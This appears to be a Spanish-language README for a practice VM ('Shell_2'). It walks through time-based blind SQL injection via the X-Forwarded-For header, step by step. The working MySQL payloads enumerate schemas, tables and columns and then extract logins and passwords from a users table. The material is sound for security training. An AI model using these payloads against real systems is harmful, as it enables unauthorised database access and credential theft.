# Shell2SQLi
Este repositorio contiene scripts utilizados para `Shell_2`, una máquina con vulnerabilidad SQLi Blind.

## Consideraciones de la máquina

Algunas consideraciones
> El host `192.168.44.134` no está editado en los scripts, la VM se utilizó con configuración NAT
> 
> Uso de encabezado `X-Forwarded-For`
> 
> Cada script tiene una descripción de procedimiento
> 
## Impacto vulnerabilidad SQLi

### Procedimiento:
Partiendo de la base en la que podemos validar una inyección exitosa en la cabecera `X-Forwarded-For` con `hack' or sleep(2) #`, además de que podemos consultar la versión de la base de datos con `test' or if(substring(@@version,1,1)='5',sleep(1),0) #`, buscamos con script1.sh hacer que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el número total de bases de datos es igual a un número que estamos probando. Encontramos que el número de bases de datos son 2 y la sentencia del script fué:
```mysql
1' or if((SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) = 'num', sleep(0.043), 0) #
```
Sabiendo el número de bases de datos, nos enfocamos a descubrir sus nombres con script2.sh con un script que hace que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el nombre de la base de datos contiene la letra en la posición indicada. Nuestro payload que nos hizo verificar la existencia de `information_schema` y de `photoblog` fué basado en la siguiente sentencia:
```mysql
1' or if((SELECT SUBSTRING(SCHEMA_NAME,'posición',1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT $((db_index-1)),1) = 'letra', sleep(0.043), 0) #
```
Continuar con el reconocimiento imperó saber el número de tablas en este caso de `photoblog`, creamos un script que nos dió un resultado de 4 tablas con un payload como el siguiente:
```mysql
1' OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='photoblog' AND table_name IS NOT NULL) > 'numero de tabla', SLEEP(0.043), 0) #
```
Descubrir el nobre de las tablas fué muy parecido a los trabajos anteriores, dentro de las 4 tablas encontramos `users` con un pauload como este:
```mysql
1' OR IF((SELECT SUBSTRING(table_name,'posición',1) FROM information_schema.tables WHERE table_schema='users' LIMIT 'numero de tabla users',1)='letra', SLEEP(0.043), 0) #
```
El siguiente script es usado para enumerar las tablas, sabiendo ya que son 4 y que el nombre es users:
```mysql
1' OR IF((SELECT SUBSTRING(column_name,'posición',1) FROM information_schema.columns WHERE table_name='users' AND table_schema='photoblog' LIMIT 'num_col',1)='letra', SLEEP(0.043), 0) #
```
Por último extraímos los valores de las columnas id, login y password en la tabla users de la base de datos photoblog.
```mysql
1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
```
    
## Disclaimer

El autor no se hace responsable de algún uso inadecuado del repositorio que pueda causar impactos negativos. El propósito es y sólo es, con fines educativos.
Las contribuciones son bienvenidas, también siéntete libre de mejorar y modificar según sea necesario.
